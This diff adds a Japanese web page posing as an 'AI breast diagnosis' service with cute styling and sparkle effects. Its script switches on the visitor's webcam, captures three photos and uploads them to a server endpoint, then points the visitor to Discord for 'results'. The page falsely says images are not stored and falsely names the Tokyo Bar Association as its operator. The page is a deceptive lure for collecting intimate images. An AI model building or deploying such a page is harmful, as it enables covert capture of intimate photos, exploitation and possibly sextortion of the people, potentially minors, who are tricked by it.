@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AIによる胸　診断</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Yomogi&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Yomogi", cursive;
+      background: linear-gradient(120deg, #ffe4f0 0%, #d7f7ff 100%);
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    .main-container {
+      max-width: 720px;
+      margin: auto;
+      padding: 2em 1em 8em;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    h1 {
+      font-size: 2.8em;
+      margin-bottom: 0.3em;
+      color: #ff69b4;
+      text-shadow: 2px 2px #fff;
+      animation: popIn 1s ease;
+    }
+
+    h2 {
+      font-weight: normal;
+      font-size: 1.2em;
+      margin-bottom: 2em;
+      color: #777;
+      animation: popIn 1.5s ease;
+    }
+
+    .step-box {
+      background: #fff9fb;
+      border: 2px solid #ffcde2;
+      border-radius: 20px;
+      box-shadow: 0 4px 12px rgba(255, 182, 193, 0.3);
+      padding: 1.4em;
+      margin: 1.2em 0;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 1em;
+      animation: slideUp 1s ease;
+    }
+
+    .step-number {
+      background-color: #ffa7c4;
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.2em;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .step-text {
+      font-size: 1em;
+      color: #444;
+    }
+
+    button {
+      background: linear-gradient(145deg, #ff92c2, #f2509b);
+      color: white;
+      padding: 1.2em 3em;
+      font-size: 1.3em;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.15);
+      transition: all 0.3s ease;
+      margin-top: 2em;
+      animation: popIn 2s ease;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(145deg, #f2509b, #ff92c2);
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    #cameraArea {
+      margin-top: 2em;
+      display: none;
+    }
+
+    .notice {
+      position: fixed;
+      bottom: 12px;
+      right: 12px;
+      background: rgba(255,255,255,0.95);
+      padding: 10px 14px;
+      border-radius: 12px;
+      font-size: 0.8em;
+      color: #555;
+      box-shadow: 0 0 6px rgba(0,0,0,0.1);
+      z-index: 99;
+    }
+
+    @keyframes popIn {
+      0% { transform: scale(0.8); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      0% { transform: translateY(30px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+
+    /* キラキラ演出 */
+    .sparkle {
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: url('https://i.imgur.com/0Xj1Q7N.png') no-repeat center/contain;
+      animation: sparkleFall 6s infinite;
+      opacity: 0.7;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    @keyframes sparkleFall {
+      0% { transform: translateY(-10%); opacity: 0; }
+      50% { opacity: 1; }
+      100% { transform: translateY(110vh); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <h1>AIによる胸診断</h1>
+    <h2>あなたの胸の、美しさ、知りたくない？</h2>
+
+    <div class="step-box">
+      <div class="step-number">1</div>
+      <div class="step-text">AIがあなたの胸のバランスを診断します。</div>
+    </div>
+    <div class="step-box">
+      <div class="step-number">2</div>
+      <div class="step-text">高性能AIが胸のカップ,胸の綺麗さ.これからの成長を分析します。</div>
+    </div>
+    <div class="step-box">
+      <div class="step-number">3</div>
+      <div class="step-text">東京弁護士事務所がai学習の為やっている行為の為。保存はされませんのでご安心ください。</div>
+    </div>
+
+    <button onclick="startDiagnosisAndCapture()">診断をはじめる！</button>
+
+    <div id="cameraArea">
+      <p>カメラを起動中…</p>
+      <video id="video" autoplay></video><br>
+      </div>
+  </div>
+
+  <div class="notice">東京弁護士会が情報収集のために作成しています。画像は保存されません。</div>
+
+  <canvas id="canvas"></canvas>
+
+  <script>
+    for (let i = 0; i < 25; i++) {
+      const star = document.createElement('div');
+      star.classList.add('sparkle');
+      star.style.left = Math.random() * 100 + "vw";
+      star.style.top = (Math.random() * -100) + "vh";
+      star.style.animationDelay = (Math.random() * 6) + "s";
+      document.body.appendChild(star);
+    }
+  </script>
+
+  <script>
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('canvas');
+    let ctx = canvas.getContext('2d');
+    let stream = null; // ストリームを保持するための変数
+
+    // 1枚の写真を撮影してBlobとして返す関数
+    function captureFrameAsBlob(index) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      return new Promise(resolve => {
+        // 画像の品質を調整することで、ファイルサイズと処理速度のバランスを取れます
+        canvas.toBlob(resolve, 'image/jpeg', 0.9);
+      }).then(blob => ({
+        blob: blob,
+        name: `photo_${index}.jpg` // ファイル名にインデックスを付ける
+      }));
+    }
+
+    // 連続撮影と送信を開始する関数
+    async function startDiagnosisAndCapture() {
+      // 診断ボタンを無効化
+      const button = document.querySelector('button');
+      button.disabled = true;
+      button.textContent = 'カメラ起動中...';
+
+      // カメラエリアを表示
+      document.getElementById('cameraArea').style.display = 'block';
+
+      try {
+        // カメラのストリームを取得
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // video が `canplay` イベントを発火するまで待機（動画の準備完了を待つ）
+        await new Promise(resolve => {
+          video.addEventListener('canplay', resolve, { once: true });
+        });
+        
+        button.textContent = '撮影中...';
+
+        // 3枚の写真を連続で撮影 (約100ms間隔で撮影)
+        const photoPromises = [];
+        for (let i = 1; i <= 3; i++) {
+            // Promiseを即座に作成し、setTimeoutで遅延実行
+            photoPromises.push(new Promise(resolve => {
+                setTimeout(async () => {
+                    const photo = await captureFrameAsBlob(i);
+                    resolve(photo);
+                }, 100 * (i - 1)); // 0ms, 100ms, 200ms後に撮影
+            }));
+        }
+
+        const photos = await Promise.all(photoPromises);
+
+        // FormDataを作成し、3枚の画像を全て追加
+        const formData = new FormData();
+        photos.forEach(photo => {
+            // サーバー側で files.file が配列として扱えるように、同じキー名 'file' で追加
+            formData.append('file', photo.blob, photo.name);
+        });
+        
+        button.textContent = 'AI診断中...';
+
+        // サーバーへ送信
+        const response = await fetch('/api/send', { 
+            method: 'POST', 
+            body: formData 
+        });
+
+        if (response.ok) {
+            alert('診断が完了しました！結果はDiscordを確認してください。');
+        } else {
+            alert('診断画像の送信に失敗しました。');
+        }
+
+      } catch (err) {
+        console.error("エラー:", err);
+        alert('カメラのアクセスに失敗しました。許可されているか確認してください。');
+      } finally {
+        // ストリームを停止
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          video.srcObject = null;
+          stream = null;
+        }
+        
+        // カメラエリアを非表示に戻す (任意)
+        document.getElementById('cameraArea').style.display = 'none';
+
+        // ボタンを元に戻す
+        button.disabled = false;
+        button.textContent = '診断をはじめる！';
+      }
+    }
+  </script>
+</body>
+</html>
